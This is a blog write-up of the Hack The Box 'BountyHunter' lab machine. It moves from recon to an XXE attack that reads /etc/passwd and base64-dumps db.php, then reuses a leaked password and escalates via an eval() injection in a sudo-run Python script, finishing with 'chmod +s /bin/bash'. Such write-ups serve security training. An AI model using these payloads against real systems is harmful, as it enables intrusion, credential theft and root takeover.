---
layout: post
title: "BountyHunter HTB writeup"
subtitle: "Walkethrough for the BountyHunter HTB machine."
date: 2024-11-07 23:45:13
background: '/img/posts/04.jpg'

---

## Report  

begin with the usual `nmap` scan.  

```bash
nmap $ip -sV
```

We get a common `22 80` machine setup.  

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108220705.png" alt="1" style="width:700px; height:auto;">
<br/>

- 22: `SSH` server.
- 80: `HTTP` server `apache 8.2p1`

Begin by interacting with port `80` using the browser.   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108220854.png" alt="1" style="width:700px; height:auto;">
<br/>

We are welcomed with this `index` page.    
Following our standard methodology, we check the `source code`. We can see something here referencing to an `email`.   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108221218.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the directory `mail/contact_me.php` but got an error `404`.    

Running `gobuster` in the background to scan for hidden directories.    

```bash
gobuster dir -u="http://$ip" -w=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt,zip,sh
```

We get some output.    

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108222226.png" alt="1" style="width:700px; height:auto;">
<br/>

The `db.php` seems interesting but we cannot see its content for now. (`size=0`).  

Lets fire up `burpsuite` to test this `contact form`.   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108224053.png" alt="1" style="width:700px; height:auto;">
<br/>

The form is not doing anything.    

Clicking on `portal`, we are redirecting to this page .   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108224223.png" alt="1" style="width:700px; height:auto;">
<br/>

Clicking on the `link`, we are welcomed with this page.    
 
<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108224409.png" alt="1" style="width:700px; height:auto;">
<br/>

Lets check this request on `burpsuite`.  

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108224628.png" alt="1" style="width:700px; height:auto;">
<br/>

Looking at the `post` data, it seems `Basse64` but `URL` encoded.   

The decoded `data`.   

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>test</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```

The data is sent over `xml`. We may do an attack called `XML entity injection`.   

`Payload`:   

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;test</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```

We will define a new `entity` that will grab the `/etc/passwd` file and display it on the screen.   

`Encode` the payload the same way and send it over the request.   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108225526.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a hit. The `/etc/passwd` file is displayed. 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

We can try to grab the content of the `db.php` file that we found earlier. But due to be a `php` file, it will be rendered by the browser so this is why we should `base64` encode it using `php wrappers`.   

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;test</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```

We get a hit.   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108230143.png" alt="1" style="width:700px; height:auto;">
<br/>

- `db.php`:

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

```

We found a clear text password that we can try to `password spray` the users found in the `/etc/passwd` file.   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108230512.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a hit, logged in as `development:m19RoAU0hP41A1sTsq6K `   

Following our standard methodology, we check the `sudo` privileges.   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108230612.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a `script` that can be run as `root` by the current user.  

`ticketValidator.py`:  

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

This script is a `Python` program designed to evaluate a specific file format, which seems to be a markdown file (.md) containing a "ticket" with structured information. Here’s a breakdown of how it works:

1. **`load_file` function**:
    
    - Accepts a file path (`loc`) as input.
    - Checks if the file has a `.md` extension.
    - If the file extension is `.md`, it opens the file in read mode and returns the file object.
    - If the file extension is not `.md`, it prints an error message (`"Wrong file type."`) and exits the program.
2. **`evaluate` function**:
    
    - Accepts an opened file object (`ticketFile`).
    - Reads through each line in the file and evaluates its contents according to specific conditions:
        - **Line 0**: Checks if the first line begins with `"# Skytrain Inc"`. If not, it returns `False` (indicating an invalid ticket).
        - **Line 1**: Checks if the second line begins with `"## Ticket to "`. If it does, it extracts and prints the destination from the rest of the line (anything following `"## Ticket to "`). If it doesn’t match, it returns `False`.
        - **Ticket Code Validation**:
            - Searches for a line that starts with `"__Ticket Code:__"`. When this line is found, the next line is expected to contain a ticket code in a specific format (with `**` around it and `+` separating elements).
            - It extracts the ticket code (by removing `**` and getting the part before `+`), checks if the ticket code, when converted to an integer, leaves a remainder of 4 when divided by 7 (`% 7 == 4`).
            - If this condition is satisfied, it calculates a "validation number" using `eval` on the ticket code line. If the validation number is greater than 100, it returns `True`, marking the ticket as valid. Otherwise, it returns `False`.
    - If no valid ticket code is found or conditions are not met, it returns `False`.

The vulnerability lies in this part of the `evaluate` function:


```python
validationNumber = eval(x.replace("**", ""))
```

The `eval` function here takes in the entire line containing the ticket code, with `**` removed. If an attacker controls this part of the file, they can inject any Python code into `x`, allowing it to execute arbitrary commands. Here’s an example of how an attacker could exploit it:

**Create a malicious ticket file**: An attacker could construct a file in which the line after `__Ticket Code:__` is something like:
 
```md
**4+__import__('os').system('id /')**
```

To create a ticket file that will bypass all those checks and be able to exploit the `eval` function.  

```md
# Skytrain Inc
## Ticket to Wonderland
__Ticket Code:__
**4+__import__('os').system('ls')**
```

Now run the command.  

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

The vulnerability was triggered. 

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108232428.png" alt="1" style="width:700px; height:auto;">
<br/>

We can achieve `root` by simply changing the payload to be `chmod +s /bin/bash`.   

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108232601.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was `pawned` successfully.  

<br/> 
<img src="/img/bountyhunter_screenhots/Pasted image 20241108232643.png" alt="1" style="width:700px; height:auto;">
<br/>


